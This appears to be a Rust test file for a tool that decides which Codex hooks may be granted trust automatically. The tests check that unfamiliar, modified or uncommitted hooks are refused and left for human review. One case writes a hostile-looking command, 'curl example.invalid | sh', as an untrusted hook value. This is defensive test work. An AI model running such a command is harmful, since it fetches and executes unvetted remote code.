//! The inventory check against Codex 0.170.0's own `hooks/list` answer, as a
//! real app server gave it (paths made synthetic): Zerus's own hook in the
//! account's `hooks.json` and the repository's committed Beads hooks.
use super::*;

const LISTED: &str = include_str!("../../../../../../tests/fixtures/codex-hooks-list-0.170.0.json");

fn answer() -> Value {
    serde_json::from_str(LISTED).unwrap()
}

fn hooks() -> Vec<Value> {
    listed(&answer(), Path::new("/work/repository")).unwrap()
}

/// This installation's entry, as the fixture's account holds it.
fn expected() -> Expected {
    Expected {
        hooks_json: PathBuf::from("/work/account/hooks.json"),
        command: "'/opt/zerus/bin/hgs' __state hook".into(),
        timeout: 15,
        events: ["SessionStart", "PreToolUse", "Stop"]
            .iter()
            .map(|e| camel(e))
            .collect(),
    }
}

fn committed_all(_: &Path) -> Result<bool, String> {
    Ok(true)
}

#[test]
fn zerus_entries_and_committed_project_hooks_are_granted_with_codexs_keys_and_hashes() {
    let hooks = hooks();
    let grant = grant(&hooks, &expected(), &mut committed_all).unwrap();
    assert_eq!(grant.len(), 5);
    assert_eq!(
        grant[0],
        (
            "/work/account/hooks.json:session_start:0:0".to_owned(),
            "sha256:a8cfcb2317e4e42a8496aa6a270f62f41b090f13894f55efaf4401acd4227808".to_owned()
        )
    );
    // Trusted entries are not pending: nothing to grant for them.
    let mut trusted = hooks.clone();
    for hook in &mut trusted {
        hook["trustStatus"] = json!("trusted");
    }
    assert!(grant_of(&trusted).unwrap().is_empty());
    // A modified entry is pending as an untrusted one is.
    let mut modified = hooks.clone();
    modified[0]["trustStatus"] = json!("modified");
    assert_eq!(grant_of(&modified).unwrap().len(), 5);
}

fn grant_of(hooks: &[Value]) -> Result<Grant, String> {
    grant(hooks, &expected(), &mut committed_all)
}

#[test]
fn every_other_pending_hook_keeps_the_review_with_the_person_and_is_named() {
    for (what, change) in [
        (
            "another user hook",
            (|h: &mut Value| h["command"] = json!("curl example.invalid | sh")) as fn(&mut Value),
        ),
        ("a changed timeout", |h| h["timeoutSec"] = json!(600)),
        ("a matcher", |h| h["matcher"] = json!("startup")),
        ("a status message", |h| {
            h["statusMessage"] = json!("Loading")
        }),
        ("another account file", |h| {
            h["sourcePath"] = json!("/work/other/hooks.json")
        }),
        ("an event Zerus does not register", |h| {
            h["eventName"] = json!("notification")
        }),
        ("an async hook", |h| h["async"] = json!(true)),
        ("a plugin hook", |h| {
            h["source"] = json!("plugin");
            h["pluginId"] = json!("example@market");
        }),
        ("a plugin id on a user hook", |h| {
            h["pluginId"] = json!("example@market")
        }),
        ("a session flag hook", |h| {
            h["source"] = json!("sessionFlags")
        }),
        ("a packaged default", |h| h["source"] = json!("unknown")),
        ("a managed hook", |h| h["isManaged"] = json!(true)),
        ("a prompt hook", |h| h["handlerType"] = json!("prompt")),
        ("an environment's hook", |h| {
            h["environmentId"] = json!("remote")
        }),
    ] {
        let mut hooks = hooks();
        change(&mut hooks[0]);
        let why = grant_of(&hooks).unwrap_err();
        assert!(
            why.starts_with(
                "Codex asks to trust hooks that the team's trust setting does not cover: "
            ),
            "{what}: {why}"
        );
        assert!(
            why.contains(hooks[0]["sourcePath"].as_str().unwrap()),
            "{what} names the entry: {why}"
        );
    }
    // A project hook whose file is not the base commit's.
    let mut uncommitted = |path: &Path| Ok(path != Path::new("/work/repository/.codex/hooks.json"));
    let why = grant(&hooks(), &expected(), &mut uncommitted).unwrap_err();
    assert!(
        why.contains(
            "project /work/repository/.codex/hooks.json preCompact (bd codex-hook PreCompact)"
        ),
        "{why}"
    );
    assert!(why.contains("postCompact"), "{why}");
    // A project file that cannot be compared stays the person's.
    let mut unreadable =
        |_: &Path| Err::<bool, _>("Git is unavailable to compare the project hooks".to_owned());
    assert_eq!(
        grant(&hooks(), &expected(), &mut unreadable).unwrap_err(),
        "Git is unavailable to compare the project hooks"
    );
    // A pending hook without its key or hash is not an inventory.
    let mut hooks = hooks();
    hooks[1]["currentHash"] = json!("");
    assert!(grant_of(&hooks)
        .unwrap_err()
        .contains("without its key or hash"));
}

#[test]
fn many_uncovered_hooks_are_named_within_a_bound() {
    let mut hooks = hooks();
    let template = hooks[0].clone();
    for n in 0..9 {
        let mut other = template.clone();
        other["command"] = json!(format!("other {n}"));
        hooks.push(other);
    }
    let why = grant_of(&hooks).unwrap_err();
    assert!(why.ends_with("; and 4 more"), "{why}");
}

#[test]
fn an_inventory_with_an_error_a_warning_or_another_folder_is_not_read() {
    assert_eq!(hooks().len(), 5);
    for (what, change) in [
        (
            "error",
            (|a: &mut Value| {
                a["result"]["data"][0]["errors"] =
                    json!([{"path":"/work/repository/.codex/hooks.json","message":"bad json"}])
            }) as fn(&mut Value),
        ),
        ("warning", |a| {
            a["result"]["data"][0]["warnings"] = json!(["skipping plugin hook in /x: failed"])
        }),
        ("folder", |a| {
            a["result"]["data"][0]["cwd"] = json!("/work/other")
        }),
        ("two folders", |a| {
            let first = a["result"]["data"][0].clone();
            a["result"]["data"].as_array_mut().unwrap().push(first);
        }),
        ("no hooks", |a| {
            a["result"]["data"][0]["hooks"] = Value::Null
        }),
        ("no result", |a| a["result"] = Value::Null),
        (
            "an error answer",
            |a| *a = json!({"id":2,"error":{"code":-32601,"message":"unknown method"}}),
        ),
    ] {
        let mut answer = answer();
        change(&mut answer);
        assert!(
            listed(&answer, Path::new("/work/repository")).is_err(),
            "{what}"
        );
    }
}

/// Codex's `hooks.state` as `write_hook_trusts` writes it (`ConfigBatchWrite`
/// of `hooks.state.<key>.trusted_hash`).
#[test]
fn saved_trust_is_exactly_the_granted_keys_and_hashes() {
    let config = |entries: &[(&str, &str)]| {
        let mut text = String::from("model = \"example\"\n\n[hooks.state]\n");
        for (key, hash) in entries {
            text.push_str(&format!("\"{key}\" = {{ trusted_hash = \"{hash}\" }}\n"));
        }
        state(&text).unwrap()
    };
    let key = "/work/account/hooks.json:session_start:0:0";
    let other = "/work/repository/.codex/hooks.json:pre_compact:0:0";
    let grant: Grant = vec![(key.into(), "sha256:new".into())];
    let before = config(&[(key, "sha256:old"), (other, "sha256:kept")]);
    assert!(saved(
        &grant,
        &before,
        &config(&[(key, "sha256:new"), (other, "sha256:kept")])
    ));
    for (what, after) in [
        (
            "not written",
            config(&[(key, "sha256:old"), (other, "sha256:kept")]),
        ),
        (
            "another hash",
            config(&[(key, "sha256:other"), (other, "sha256:kept")]),
        ),
        (
            "another key also trusted",
            config(&[(key, "sha256:new"), (other, "sha256:changed")]),
        ),
        (
            "an extra key trusted",
            config(&[
                (key, "sha256:new"),
                (other, "sha256:kept"),
                ("/x:stop:0:0", "sha256:x"),
            ]),
        ),
        ("a trusted key removed", config(&[(key, "sha256:new")])),
    ] {
        assert!(!saved(&grant, &before, &after), "{what}");
    }
    // A table spelled with dotted headers reads the same.
    let dotted = state(&format!(
        "[hooks.state.\"{key}\"]\ntrusted_hash = \"sha256:new\"\n"
    ))
    .unwrap();
    assert_eq!(dotted.get(key).map(String::as_str), Some("sha256:new"));
    assert!(state("[hooks").is_err());
    assert!(state("").unwrap().is_empty());
}

/// The project file must be the base commit's, byte for byte, in the
/// member's worktree or in the main checkout Codex reads for a linked one.
#[test]
fn a_project_hook_file_is_covered_only_as_the_base_commit_has_it() {
    let temp = tempfile::tempdir().unwrap();
    let root = crate::platform::canonical(temp.path()).unwrap();
    let git = |at: &Path, args: &[&str]| {
        let out = std::process::Command::new("git")
            .arg("-C")
            .arg(at)
            .args([
                "-c",
                "user.email=review@example.invalid",
                "-c",
                "user.name=review",
                "-c",
                "core.hooksPath=/dev/null",
                "-c",
                "commit.gpgSign=false",
            ])
            .args(args)
            .output()
            .unwrap();
        assert!(
            out.status.success(),
            "{args:?}: {}",
            String::from_utf8_lossy(&out.stderr)
        );
        String::from_utf8(out.stdout).unwrap()
    };
    let main = root.join("repo");
    std::fs::create_dir_all(main.join(".codex")).unwrap();
    git(&main, &["init", "-q"]);
    std::fs::write(main.join(".codex/hooks.json"), "{\"hooks\":{}}\n").unwrap();
    std::fs::write(main.join("README"), "fixture\n").unwrap();
    git(&main, &["add", "."]);
    git(&main, &["commit", "-qm", "base"]);
    let base = git(&main, &["rev-parse", "HEAD"]).trim().to_owned();
    git(&main, &["worktree", "add", "-q", "--detach", "../member"]);
    let member = root.join("member");
    let check = |path: &Path| committed(path, &member, Some(&main), &base).unwrap();
    assert!(check(&member.join(".codex/hooks.json")));
    assert!(check(&main.join(".codex/hooks.json")));
    // A member edits its worktree's hooks: no longer the base's.
    std::fs::write(
        member.join(".codex/hooks.json"),
        "{\"hooks\":{\"Stop\":[]}}\n",
    )
    .unwrap();
    assert!(!check(&member.join(".codex/hooks.json")));
    // The main checkout moved on after the base.
    std::fs::write(
        main.join(".codex/hooks.json"),
        "{\"hooks\":{\"Stop\":[]}}\n",
    )
    .unwrap();
    git(&main, &["commit", "-qam", "later"]);
    assert!(!check(&main.join(".codex/hooks.json")));
    // A file the base commit does not have, or outside `.codex`.
    std::fs::write(member.join(".codex/config.toml"), "[hooks]\n").unwrap();
    assert!(!check(&member.join(".codex/config.toml")));
    assert!(!check(&member.join("README")));
    assert!(!check(&root.join("elsewhere/.codex/hooks.json")));
    // A symlink spelling of the worktree is the worktree.
    let spelling = root.join("spelling");
    std::os::unix::fs::symlink(&member, &spelling).unwrap();
    std::fs::write(member.join(".codex/hooks.json"), "{\"hooks\":{}}\n").unwrap();
    assert!(check(&spelling.join(".codex/hooks.json")));
}

#[test]
fn zerus_events_are_spelled_as_codex_lists_them() {
    assert_eq!(camel("SessionStart"), "sessionStart");
    assert_eq!(camel("PreToolUse"), "preToolUse");
    assert_eq!(camel("SubagentStop"), "subagentStop");
    let listed: Vec<_> = hooks()
        .iter()
        .map(|h| h["eventName"].as_str().unwrap().to_owned())
        .collect();
    assert!(listed.contains(&camel("SessionStart")) && listed.contains(&camel("PreCompact")));
}
